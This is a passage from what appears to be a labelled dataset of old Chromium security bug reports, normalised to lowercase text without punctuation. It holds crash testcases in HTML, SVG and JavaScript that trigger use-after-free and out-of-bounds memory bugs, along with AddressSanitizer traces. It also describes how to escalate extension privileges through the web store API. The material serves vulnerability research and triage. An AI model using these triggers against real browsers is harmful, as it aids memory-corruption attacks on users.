calls stats 0m really freed by 0 calls stats 0m 0 pages mmaped in 0 calls stats 67m of shadow memory allocated in 67 clusters 1m each 0 low and 67 high shadow byte and word f1 f4 f3 f2 f1 00 00 00 00 more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f4 f3 f2 f1 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 this bug is confirmed by our asan expert alex thanks a lot alex the patch below makes chrome print the source_height and source_width before crashing in scaleyuvtorgb32 both arguments are 0 that s why the oob access is a true positive one here ybuf source_width ybuf source_width-1 the function does not respect the zero values at all and operates source_height and source_width in a harmful way above the crash place 200 rotations that start at right side of image 201 if view_rotate rotate_180 202 view_rotate rotate_270 203 view_rotate mirror_rotate_0 204 view_rotate mirror_rotate_90 205 y_buf source_width 1 206 u_buf source_width 2 1 207 v_buf source_width 2 1 208 source_width source_width 209 210 rotations that start at bottom of image 211 if view_rotate rotate_90 212 view_rotate rotate_180 213 view_rotate mirror_rotate_90 214 view_rotate mirror_rotate_180 215 y_buf source_height 1 y_pitch 216 u_buf source_height y_shift 1 uv_pitch 217 v_buf source_height y_shift 1 uv_pitch 218 source_height source_height 219 so yes this is indeed a bug 8 svn diff media/base/yuv_convert.cc index media/base/yuv_convert.cc media/base/yuv_convert.cc revision 92981 media/base/yuv_convert.cc working copy 34,6 34,7 include emmintrin.h endif include stdio.h namespace media 16.16 fixed point arithmetic 177,6 178,7 yuvtype yuv_type rotate view_rotate scalefilter filter fprintf stderr source_width d source_height d\n source_width source_height 4096 allows 3 buffers to fit in 12k helps performance on cpu with 16k l1 cache large enough for and 30 displays which are 8	11
use after free or bad cast with empty swf file repro.html script var owindow window.open repro.swf settimeout function owindow.close 1000 script repro.swf is empty 0 bytes at first glance it looks like no np plugin object is created or it gets deleted because of the empty swf file then the window is closed and chrome tells the np plugin object to release itself or releases the object not sure yet either way there is no such object only garbage leading to random memory access in a method call i m not sure if it s flash specific or if any np plugin can have this problem	11
stale node in stylesheetcandidatelisthashset vulnerability details tab is crashing when modifying svg file i had two different crash places with this test case probably they are due to one one bug first crash place is shown in attachment dbg-1.tar.gz and is related to 15.0.849.0 dev-m unfortunately i do n't have minimized test case i have only huge one second crash looks more dangerous for that test case is attached here with debug info dbg-2.tar.gz reproduced on 14.0.835.35 beta-m one note about test case if to change font size in test case then register eax value changes too version windows xp sp3 15.0.849.0 dev-m 14.0.835.35 beta-m reproduction case see attachment	9
use after free in focuscontroller advancefocusindocumentorder you have to press a key when the page loads up vulnerability details use-after-free version chrome version stable trunk operating system linux 64bit reproduction case attached you have to press a key in the focused text field for crashes please include the following additional information type of crash renderer asan/vg crash state 28518 error addresssanitizer crashed on address at pc bp sp read of size 8 at thread t0 0 in webcore focuscontroller advancefocusindocumentorder webcore focusdirection webcore keyboardevent bool 0 is located 120 bytes inside of 240-byte region freed by thread t0 here 0 in operator delete void asan_rtl 1 in webcore containernode removechildren 0 previously allocated by thread t0 here 0 in operator new unsigned long asan_rtl 1 in webcore htmliframeelement create webcore qualifiedname const webcore document 0	11
oob read in gpu gles2 gles2decoderimpl handledrawarrays testcase run from layouttests/fast/canvas/webgl script src js/resources/js-test-pre.js script script src resources/webgl-test.js script div id console script var context create3dcontext var program loadstandardprogram context context.useprogram program shouldgenerateglerror context context.invalid_operation context.drawarrays context.triangles 0 200 shouldgenerateglerror context context.invalid_operation context.drawarrays context.triangles 0 script mnt/scratch0/chrome/src/out/release/dumprendertree asan sigill hint if your stack trace looks short or garbled use asan_options=fast_unwind=0 19757 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in run_vp third_party/mesa/mesalib/src/mesa/tnl/t_vb_program.c:0 1 in tnl_run_pipeline 2 in tnl_draw_prims 3 in tnl_vbo_draw_prims 4 in flush_vertex third_party/mesa/mesalib/src/mesa/vbo/vbo_split_inplace.c:0 5 in vbo_split_inplace 6 in tnl_draw_prims 7 in tnl_vbo_draw_prims 8 in vbo_exec_drawarrays third_party/mesa/mesalib/src/mesa/vbo/vbo_exec_array.c:0 9 in gpu gles2 gles2decoderimpl handledrawarrays unsigned int gpu gles2 drawarrays const 10 in gpu gles2 gles2decoderimpl docommand unsigned int unsigned int void const 11 in gpu commandparser processcommand 12 in gpu gpuscheduler putchanged 13 in webkit gpu glinprocesscontext pumpcommands 14 in gpu commandbufferservice flushsync int int 15 in gpu commandbufferhelper finish 16 in gpu gles2 gles2implementation waitforcmd 17 in gpu gles2 gles2implementation getglerror 18 in webcore webglrenderingcontextinternal geterrorcallback v8 arguments const out/release/obj/gen/webkit/bindings/v8derivedsources19.cpp:0 19 in v8 internal builtin_handleapicall v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate v8/src/builtins.cc:0 20 in is located 12 bytes to the right of 3200-byte region allocated by thread t0 here 1 in mesa_realloc 2 in mesa_buffer_data third_party/mesa/mesalib/src/mesa/main/bufferobj.c:0 3 in mesa_bufferdataarb 4 in gpu gles2 gles2decoderimpl simulateattrib0 unsigned int 5 in gpu gles2 gles2decoderimpl handledrawarrays unsigned int gpu gles2 drawarrays const 6 in gpu gles2 gles2decoderimpl docommand unsigned int unsigned int void const 7 in gpu commandparser processcommand 8 in gpu gpuscheduler putchanged 9 in webkit gpu glinprocesscontext pumpcommands 10 in gpu commandbufferservice flushsync int int 11 in gpu commandbufferhelper finish 12 in gpu gles2 gles2implementation waitforcmd 13 in gpu gles2 gles2implementation getglerror 14 in webcore webglrenderingcontextinternal geterrorcallback v8 arguments const out/release/obj/gen/webkit/bindings/v8derivedsources19.cpp:0 15 in v8 internal builtin_handleapicall v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate v8/src/builtins.cc:0 16 in 17 in 18 in 19 in 20 in 19757 aborting shadow byte and word fa fa fa fa fa fa fa fa fa more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa base debug stacktrace stacktrace base anonymous namespace stackdumpsignalhandler asan_report_error run_vp tnl_run_pipeline tnl_draw_prims tnl_vbo_draw_prims flush_vertex vbo_split_inplace tnl_draw_prims tnl_vbo_draw_prims vbo_exec_drawarrays gpu gles2 gles2decoderimpl handledrawarrays gpu gles2 gles2decoderimpl docommand gpu commandparser processcommand gpu gpuscheduler putchanged webkit gpu glinprocesscontext pumpcommands gpu commandbufferservice flushsync gpu commandbufferhelper finish gpu gles2 gles2implementation waitforcmd gpu gles2 gles2implementation getglerror webcore webglrenderingcontextinternal geterrorcallback v8 internal builtin_handleapicall	11
security accessibility of the chrome.webstoreprivate-api summary the chrome browser allows to install browser-extensions through the javascript chrome.webstoreprivate-api this api is only accessible to a small white-listed number of domains corresponding to this whitelist there is a blacklist of domains which are not scriptable for extensions and which can not be connected to via http the whitelist and the blacklist do not match yielding to the possibility of man-in-the-middle attackers installing browser-extensions as well as the possibility of browser-extensions with limited permissions installing extensions with unlimited permissions the severety of this bug has been reduced in recent versions because the chrome-browser does now always ask the user before installing extesions as of may 2011 this was not the case and the bug could be abused to install extensions without further user interaction version chromium 13.0.782.107 developer build 0 linux chrome 13.0.782.1/12 m windows details the following is the offending manifest.json which allows access to the chrome.webstoreprivate-api from http-sites key name chrome web store version 0.1 description web store icons app launch web_url urls chrome.google.com/extensions chrome.google.com/webstore clients2.google.com/service/update2 clients2.googleusercontent.com/crx permissions webstoreprivate management poc this bug allows man-in-the-middle attackers the installation of browser-extensions furthermore this bug allows malicious browser-extensions with permissions to script any of the whitelisted domains to escalate their privileges by installing a new extension with unlimited privileges a poc-exploit for the latter part of the bug can be found in the attachement recommendations fix the manifest.json for the web-store to read urls credits bernhard bruhns brehm of recurity labs	2
use after free in webcore text recalcstyle due to before after content issue in table parts found in my fuzzing asan clusterfuzz bot cluster_fuzz_58 on platform linux chromium revision 96444 webkit revision 92846 testcase style target after content after display table-row style summary div id not-target style color-interpolation element display table tt tt content script document.getelementbyid not-target id target document.body.offsettop document.body.style.color red script mnt/scratch0/chrome/src/out/release/dumprendertree asan sigill hint if your stack trace looks short or garbled use asan_options=fast_unwind=0 25981 error addresssanitizer crashed on address at pc bp sp read of size 8 at thread t0 0 in webcore text recalcstyle webcore node stylechange 1 in webcore element recalcstyle webcore node stylechange 2 in webcore element recalcstyle webcore node stylechange 3 in webcore element recalcstyle webcore node stylechange 4 in webcore element recalcstyle webcore node stylechange 5 in webcore element recalcstyle webcore node stylechange 6 in webcore document recalcstyle webcore node stylechange 7 in webcore document updatestyleifneeded 8 in webcore document updatestyleforalldocuments 9 in webcore scriptelement executescript webcore scriptsourcecode const 10 in webcore scriptelement preparescript wtf textposition wtf onebasednumber const webcore scriptelement legacytypesupport 11 in webcore htmlscriptrunner runscript webcore element wtf textposition wtf onebasednumber const 12 in webcore htmlscriptrunner execute wtf passrefptr webcore element wtf textposition wtf onebasednumber const 13 in webcore htmldocumentparser runscriptsforpausedtreebuilder 14 in webcore htmldocumentparser cantakenexttoken webcore htmldocumentparser synchronousmode webcore pumpsession 15 in webcore htmldocumentparser pumptokenizer webcore htmldocumentparser synchronousmode 16 in webcore htmldocumentparser append webcore segmentedstring const 17 in webcore decodeddatadocumentparser flush webcore documentwriter 18 in webcore documentwriter endifnotloadingmainresource 19 in webcore frameloader finishedloading 20 in webcore mainresourceloader didfinishloading double 21 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base time const 22 in anonymous namespace requestproxy notifycompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base time const webkit/tools/test_shell/simple_resource_loader_bridge.cc:0 23 in base subtle taskclosureadapter run 24 in messageloop runtask messageloop pendingtask const 25 in messageloop deferorrunpendingtask messageloop pendingtask const 26 in messageloop dowork 27 in anonymous namespace worksourcedispatch gsource int void void base/message_pump_glib.cc:0 28 in g_main_dispatch build/buildd/glib2.0-2.24.1/glib/gmain.c:1960 29 in g_main_context_iterate build/buildd/glib2.0-2.24.1/glib/gmain.c:2591 30 in ia__g_main_context_iteration build/buildd/glib2.0-2.24.1/glib/gmain.c:2654 31 in base messagepumpgtk runonce gmaincontext bool 32 in base messagepumpglib runwithdispatcher base messagepump delegate base messagepumpdispatcher 33 in messageloop runinternal 34 in messageloop run 35 in testshell waittestfinished 36 in testshell runfiletest testparams const 37 in runtest testshell testparams std basic_string char std char_traits char std allocator char const bool third_party/webkit/tools/dumprendertree/chromium/dumprendertree.cpp:0 38 in main 39 in libc_start_main build/buildd/eglibc-2.11.1/csu/libc-start.c:258 40 in start is located 0 bytes inside of 96-byte region freed by thread t0 here 1 in webcore renderobjectchildlist updatebeforeaftercontent webcore renderobject webcore pseudoid webcore renderobject const 2 in webcore renderinline styledidchange webcore styledifference webcore renderstyle const 3 in webcore renderobject setstyle wtf passrefptr webcore renderstyle 4 in webcore renderobject setanimatablestyle wtf passrefptr webcore renderstyle 5 in webcore node setrenderstyle wtf passrefptr webcore renderstyle 6 in webcore element recalcstyle webcore node stylechange 7 in webcore element recalcstyle webcore node stylechange 8 in webcore element recalcstyle webcore node stylechange 9 in webcore element recalcstyle webcore node stylechange 10 in webcore element recalcstyle webcore node stylechange 11 in webcore document recalcstyle webcore node stylechange 12 in webcore document updatestyleifneeded 13 in webcore document updatestyleforalldocuments 14 in webcore scriptelement executescript webcore scriptsourcecode const 15 in webcore scriptelement preparescript wtf textposition wtf onebasednumber const webcore scriptelement legacytypesupport 16 in webcore htmlscriptrunner runscript webcore element wtf textposition wtf onebasednumber const 17 in webcore htmlscriptrunner execute wtf passrefptr webcore element wtf textposition wtf onebasednumber const 18 in webcore htmldocumentparser runscriptsforpausedtreebuilder 19 in webcore htmldocumentparser cantakenexttoken webcore htmldocumentparser synchronousmode webcore pumpsession 20 in webcore htmldocumentparser pumptokenizer webcore htmldocumentparser synchronousmode 21 in webcore htmldocumentparser append webcore segmentedstring const 22 in webcore decodeddatadocumentparser flush webcore documentwriter 23 in webcore documentwriter endifnotloadingmainresource 24 in webcore frameloader finishedloading 25 in webcore mainresourceloader didfinishloading double 26 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base time const 27 in anonymous namespace requestproxy notifycompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base time const webkit/tools/test_shell/simple_resource_loader_bridge.cc:0 28 in base subtle taskclosureadapter run 29 in messageloop runtask messageloop pendingtask const previously allocated by thread t0 here 1 in webcore text createrenderer webcore renderarena webcore renderstyle 2 in webcore noderendererfactory createrendererandstyle 3 in webcore noderendererfactory createrendererifneeded 4 in webcore node createrendererifneeded 5 in webcore text attach 6 in webcore containernode attach 7 in webcore element attach 8 in webcore containernode attach 9 in webcore element attach 10 in webcore shadowcontentelement attach 11 in webcore containernode attach 12 in webcore shadowroot attach 13 in webcore shadowroot recalcstyle webcore node stylechange 14 in webcore element recalcstyle webcore node stylechange 15 in webcore element recalcstyle webcore node stylechange 16 in webcore element recalcstyle webcore node stylechange 17 in webcore document recalcstyle webcore node stylechange 18 in webcore document updatestyleifneeded 19 in webcore document updatelayout 20 in webcore document updatelayoutignorependingstylesheets 21 in webcore element offsettop 22 in webcore elementinternal offsettopattrgetter v8 local v8 string v8 accessorinfo const out/release/obj/gen/webkit/bindings/v8derivedsources03.cpp:0 23 in v8 internal object getpropertywithcallback v8 internal object v8 internal object v8 internal string v8 internal object 25981 aborting stats 0m malloced 0m for red zones by 0 calls stats 0m realloced by 0 calls stats 0m freed by 0 calls stats 0m really freed by 0 calls stats 0m 0 pages mmaped in 0 calls mmaps by size mallocs by size frees by size rfrees by size stats malloc large 0 small slow 0 shadow byte and word fb fb fb fb fb fb fb fb fb more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff fb fb fb fb fb fb fb fb base debug stacktrace stacktrace base anonymous namespace stackdumpsignalhandler asan_report_error webcore text recalcstyle webcore element recalcstyle	11
oob read in tibetan_nextsyllableboundary found in my fuzzing asan clusterfuzz bot cluster_fuzz_280 on platform linux chromium revision 99677 webkit revision 94518 testcase style html margin-left buttonface list-style-type tibetan style li mnt/scratch0/chrome/src/out/debug/dumprendertree asan sigill hint if your stack trace looks short or garbled use asan_options=fast_unwind=0 13305 error addresssanitizer unknown-crash on address at pc bp sp read of size 1 at thread t0 0 in tibetan_nextsyllableboundary src/third_party/harfbuzz/src/harfbuzz-tibetan.c:166 1 in hb_tibetanshape src/third_party/harfbuzz/src/harfbuzz-tibetan.c:226 2 in hb_shapeitem src/third_party/harfbuzz/src/harfbuzz-shaper.cpp:1354 3 in webcore complextextcontroller shapeglyphs 4 in webcore complextextcontroller nextscriptrun 5 in webcore complextextcontroller widthoffullrun 6 in webcore font floatwidthforcomplextext webcore textrun const wtf hashset webcore simplefontdata const wtf ptrhash webcore simplefontdata const wtf hashtraits webcore simplefontdata const webcore glyphoverflow const 7 in webcore renderlistmarker computepreferredlogicalwidths 8 in webcore renderlistitem updatemarkerlocation 9 in webcore renderlistitem layout 10 in webcore renderblock layoutblockchild webcore renderbox webcore renderblock margininfo int int 11 in webcore renderblock layoutblockchildren bool int 12 in webcore renderblock layoutblock bool int webcore renderblock blocklayoutpass 13 in webcore renderblock layout 14 in webcore renderblock layoutblockchild webcore renderbox webcore renderblock margininfo int int 15 in webcore renderblock layoutblockchildren bool int 16 in webcore renderblock layoutblock bool int webcore renderblock blocklayoutpass 17 in webcore renderblock layout 18 in webcore renderblock layoutblockchild webcore renderbox webcore renderblock margininfo int int 19 in webcore renderblock layoutblockchildren bool int 20 in webcore renderblock layoutblock bool int webcore renderblock blocklayoutpass 21 in webcore renderblock layout 22 in webcore renderview layout 23 in webcore frameview layout bool 24 in webcore document implicitclose 25 in webcore frameloader checkcompleted 26 in webcore frameloader finishedparsing 27 in webcore document finishedparsing 28 in webcore htmldocumentparser preparetostopparsing 29 in webcore documentwriter endifnotloadingmainresource 30 in webcore frameloader finishedloading 31 in webcore mainresourceloader didfinishloading double 32 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base time const src/webkit/glue/weburlloader_impl.cc:629 33 in anonymous namespace requestproxy notifycompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base time const src/webkit/tools/test_shell/simple_resource_loader_bridge.cc:275 34 in base subtle taskclosureadapter run src/base/task.cc:56 35 in messageloop runtask messageloop pendingtask const src/base/message_loop.cc:477 36 in messageloop deferorrunpendingtask messageloop pendingtask const src/base/message_loop.cc:492 37 in messageloop dowork src/base/message_loop.cc:682 38 in base messagepumpglib handledispatch src/base/message_pump_glib.cc:275 39 in anonymous namespace worksourcedispatch gsource int void void src/base/message_pump_glib.cc:108 40 in g_main_dispatch build/buildd/glib2.0-2.24.1/glib/gmain.c:1960 41 in g_main_context_iterate build/buildd/glib2.0-2.24.1/glib/gmain.c:2591 42 in ia__g_main_context_iteration build/buildd/glib2.0-2.24.1/glib/gmain.c:2654 43 in base messagepumpgtk runonce gmaincontext bool src/base/message_pump_gtk.cc:41 44 in base messagepumpglib runwithdispatcher base messagepump delegate base messagepumpdispatcher src/base/message_pump_glib.cc:206 45 in messageloop runinternal src/base/message_loop.cc:443 46 in messageloop run src/base/message_loop.cc:341 47 in testshell waittestfinished src/third_party/webkit/tools/dumprendertree/chromium/testshellgtk.cpp:184 48 in testshell runfiletest testparams const src/third_party/webkit/tools/dumprendertree/chromium/testshell.cpp:236 49 in runtest src/third_party/webkit/tools/dumprendertree/chromium/dumprendertree.cpp:123 50 in main src/third_party/webkit/tools/dumprendertree/chromium/dumprendertree.cpp:254 51 in libc_start_main build/buildd/eglibc-2.11.1/csu/libc-start.c:258 52 in start is located 29 bytes to the right of global variable pretty_function__.hb_tibetanattributes of size 100 is located 31 bytes to the left of global variable tibetanform of size 128 13305 aborting shadow byte and word fc 04 f9 f9 f9 fc fc fc fc more shadow bytes 00 00 00 00 00 f9 f9 f9 fc fc fc fc 00 06 f9 f9 fc fc fc fc 00 00 00 00 00 00 00 00 00 00 00 00 04 f9 f9 f9 fc fc fc fc 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fc fc fc fc 00 00 00 00 00 00 00 00 00 00 00 00 base debug stacktrace stacktrace base anonymous namespace stackdumpsignalhandler asan_report_error tibetan_nextsyllableboundary hb_tibetanshape hb_shapeitem webcore complextextcontroller shapeglyphs webcore complextextcontroller nextscriptrun webcore complextextcontroller widthoffullrun webcore font floatwidthforcomplextext webcore renderlistmarker computepreferredlogicalwidths webcore renderlistitem updatemarkerlocation webcore renderlistitem layout webcore renderblock layoutblockchild webcore renderblock layoutblockchildren webcore renderblock layoutblock webcore renderblock layout webcore renderblock layoutblockchild webcore renderblock layoutblockchildren webcore renderblock layoutblock webcore renderblock layout webcore renderblock layoutblockchild webcore renderblock layoutblockchildren webcore renderblock layoutblock webcore renderblock layout webcore renderview layout webcore frameview layout webcore document implicitclose webcore frameloader checkcompleted webcore frameloader finishedparsing webcore document finishedparsing webcore htmldocumentparser preparetostopparsing webcore documentwriter endifnotloadingmainresource webcore frameloader finishedloading webcore mainresourceloader didfinishloading webkit_glue weburlloaderimpl context oncompletedrequest anonymous namespace requestproxy notifycompletedrequest base subtle taskclosureadapter run messageloop runtask messageloop deferorrunpendingtask messageloop dowork base messagepumpglib handledispatch anonymous namespace worksourcedispatch base messagepumpgtk runonce base messagepumpglib runwithdispatcher messageloop runinternal messageloop run testshell waittestfinished testshell runfiletest runtest main	11
use after free in rendertext lineboxes vulnerability details use-after free with webkit-columns version chrome version trunk beta not stable operating system linux 64bit reproduction case attached for crashes please include the following additional information type of crash renderer 10859 error addresssanitizer crashed on address at pc bp sp read of size 4 at thread t0 0 in webcore bidicontext create unsigned char wtf unicode direction bool webcore bidiembeddingsource webcore bidicontext 0 1 in webcore bidistatus bidistatus webcore textdirection bool 0 is located 0 bytes inside of 16-byte region freed by thread t0 here 0 in free asan_rtl 1 in webcore rootinlinebox childremoved webcore inlinebox 0	11
use after free due to style not updated for svg text runs branched off	9
use after free in offlineaudiodestinationnode notifycompletedispatch found in my fuzzing asan clusterfuzz this reproduce on clusterfuzz which are headless machines do n't reproduce easily there sometimes it does sometimes it does n't ca n't get them to reproduce on my linux z600 but code author should be be to see the point of free and use after free bot cluster_fuzz_400 on platform linux chromium revision 100345 webkit revision 94821 mnt/scratch0/chrome/src/out/release/dumprendertree mnt/scratch0/chrome/src/third_party/webkit/layouttests/webaudio/fuzz-lyt-audiobuffersource1315633582.25.html asan sigill hint if your stack trace looks short or garbled use asan_options=fast_unwind=0 924 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore offlineaudiodestinationnode notifycompletedispatch void 1 in base subtle taskclosureadapter run 2 in messageloop runtask messageloop pendingtask const 3 in messageloop deferorrunpendingtask messageloop pendingtask const 4 in messageloop dowork 5 in base messagepumpglib runwithdispatcher base messagepump delegate base messagepumpdispatcher 6 in messageloop runinternal 7 in messageloop run 8 in testshell waittestfinished 9 in testshell runfiletest testparams const 10 in runtest testshell testparams std basic_string char std char_traits char std allocator char const bool third_party/webkit/tools/dumprendertree/chromium/dumprendertree.cpp:0 11 in main 12 in libc_start_main build/buildd/eglibc-2.11.1/csu/libc-start.c:258 13 in start is located 16 bytes inside of 144-byte region freed by thread t0 here 1 in webcore audiocontext deletemarkednodes 2 in webcore audionode deref webcore audionode reftype 3 in void webcore domdata handleweakobject void webcore domdatastore domwrappermaptype v8 persistent v8 object void 4 in webcore domdatastore weakdomobjectcallback v8 persistent v8 value void 5 in v8 internal globalhandles node postgarbagecollectionprocessing v8 internal isolate v8 internal globalhandles previously allocated by thread t0 here 1 in webcore audiocontext audiocontext webcore document unsigned int unsigned long double 2 in webcore audiocontext createofflinecontext webcore document unsigned int unsigned long double int 3 in webcore v8audiocontext constructorcallback v8 arguments const 4 in v8 internal builtin_handleapicallconstruct v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate v8/src/builtins.cc:0 5 in 6 in 7 in 8 in 9 in 10 in 11 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal object bool v8/src/execution.cc:0 12 in v8 function call v8 handle v8 object int v8 handle v8 value 13 in webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value 14 in webcore v8eventlistener calllistenerfunction webcore scriptexecutioncontext v8 handle v8 value webcore event 15 in webcore v8abstracteventlistener invokeeventhandler webcore scriptexecutioncontext webcore event v8 handle v8 value 16 in webcore v8abstracteventlistener handleevent webcore scriptexecutioncontext webcore event 17 in webcore eventtarget fireeventlisteners webcore event webcore eventtargetdata wtf vector webcore registeredeventlistener 1ul 18 in webcore eventtarget fireeventlisteners webcore event 19 in webcore domwindow dispatchevent wtf passrefptr webcore event wtf passrefptr webcore eventtarget 20 in webcore domwindow dispatchtimedevent wtf passrefptr webcore event webcore document double double 21 in webcore domwindow dispatchloadevent 924 aborting shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 00 00 00 00 00 fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa base debug stacktrace stacktrace base anonymous namespace stackdumpsignalhandler asan_report_error webcore offlineaudiodestinationnode notifycompletedispatch base subtle taskclosureadapter run messageloop runtask messageloop deferorrunpendingtask messageloop dowork base messagepumpglib runwithdispatcher messageloop runinternal messageloop run testshell waittestfinished testshell runfiletest runtest main	9
v8 stale pointer in cssstylesheet invalid cast in v8listenerlist dofindwrapper credit serg broken off 4 stale pointer in cssstylesheet a style sheet wrapper contains a hidden reference to its owner node to keep it alive v8 handle v8 value tov8 cssstylesheet impl v8domwrapper setnamedhiddenreference wrapper ownernode tov8 ownernode the bug is partially caused by void styleelement createsheet element e int startlinenumber const string text if m_sheet if m_sheet isloading document removependingsheet m_sheet clearownernode should be here m_sheet 0 5 invalid cast in v8listenerlist dofindwrapper static v8eventlistener dofindwrapper v8 local v8 object object v8 handle v8 string wrapperproperty v8 local v8 value listener object gethiddenvalue wrapperproperty if listener.isempty return 0 return static_cast v8eventlistener v8 external unwrap listener repro propname webcore hiddenproperty listener obj object.prototype.__definesetter propname function delete object.prototype propname hiddenobj this addeventlistener message obj hiddenobj propname removeeventlistener message obj hidden values would be safe if jsobject sethiddenpropertiesobject set the object s prototype to null serg can you please provide patch on the webkit bug soon we have an upcoming deadline on tuesday to merge the fixes	11
pdf missing integer validation for flate lzw fax prediction codes and other parameters unsure what impact it has so using secseverity-none for now i ll deal with this when i get back from leave	11
heap-use-after-free in webcore counternode insertafter vulnerability details use after free version chrome version chromium 17.0.960.0 developer build 112931 os linux webkit 535.11 trunk 101868 javascript v8 3.7.11 operating system linux 64bit reproduction case html head style td counter-increment list-item style head body table td td ul ul ul ul li li table table td td table body html for crashes please include the following additional information type of crash renderer asan/vg crash state 31104 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore counternode insertafter webcore counternode webcore counternode wtf atomicstring const 0 is located 32 bytes inside of 72-byte region freed by thread t0 here 0 in free usr/local/google/asan/address-sanitizer/asan/asan_malloc_linux.cc:37 1 in webcore findplaceforcounter webcore renderobject wtf atomicstring const bool webcore counternode webcore counternode third_party/webkit/source/webcore/rendering/rendercounter.cpp:0 2 in webcore makecounternode webcore renderobject wtf atomicstring const bool third_party/webkit/source/webcore/rendering/rendercounter.cpp:0	11
heap-use-after-free in webkit webframeimpl viewimpl vulnerability details use-after-free with iframes workers and database transaction version chrome version chromium 18.0.983.0 developer build 115770 os linux webkit 535.15 103658 javascript v8 3.8.2.1 operating system ubuntu 64bit reproduction case script settimeout location.reload 100 function crash var bb new window.webkitblobbuilder bb.append var db opendatabasesync 1 postmessage bye var bloburl window.webkiturl.createobjecturl bb.getblob new worker bloburl function crash2 var f document.createelement iframe f.src location document.body.appendchild f document.body.appendchild f.clonenode true if parent window onload=crash2 else onload=crash script http schema required because of worker for crashes please include the following additional information type of crash renderer worker crash state 28576 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webkit webframeimpl viewimpl const 0 1 in non-virtual thunk to webkit webworkerclientimpl allowdatabase webkit webframe webkit webstring const webkit webstring const unsigned long 0 is located 256 bytes inside of 392-byte region freed by thread t0 here 0 in free 0 1 in webcore frameloader frameloader 0 2 in webcore frame frame 0 3 in webcore frameview frameview 0	11
heap-buffer-overflow in matroska_parse_block detailed report uploader mjurczyk google.com crash type heap-buffer-overflow read 1 crash address crash state crash stack matroska_parse_block matroska_read_packet av_read_packet minimized testcase 1024.00 kb	11
heap-use-after-free in webcore subframeloader loadsubframe vulnerability details heap use after free happens when appending i frame to an element with attached event listener version 18.0.1018.0 developer build 119055 linux does not crash on 16.0.912.77 m win7 x64 reproduction case script function go q document.getelementbyid root contentdocument setinterval function x a='window.scroll 0 1 q.getelementbyid g addeventlistener load function eval a 1 a='document.open q.getelementbyid d setattribute domcharacterdatamodified a q.getelementbyid g appendchild document.createelement frame 1 script object data t.svg id root onload go object t.svg svg d id d d g id g g svg for crashes please include the following additional information 9634 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore node renderer const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:473 1 in webcore subframeloader loadorredirectsubframe webcore htmlframeownerelement webcore kurl const wtf atomicstring const bool bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/subframeloader.cpp:241 2 in webcore subframeloader requestframe webcore htmlframeownerelement wtf string const wtf atomicstring const bool bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/subframeloader.cpp:84 3 in webcore htmlframeownerelement contentframe const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/htmlframeownerelement.h:41 4 in webcore notifychildinserted webcore node media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:1102 5 in webcore containernode appendchild wtf passrefptr webcore node int bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:667 6 in webcore node appendchild wtf passrefptr webcore node int bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:669 7 in webcore v8node appendchildcallback v8 arguments const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/custom/v8nodecustom.cpp:124 8 in handleapicallhelper media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1220 9 10 11 12 13 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 14 in v8 function call v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/v8/src/api.cc:3601 15 in webcore v8proxy instrumentedcallfunction webcore page v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:432 16 in webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value 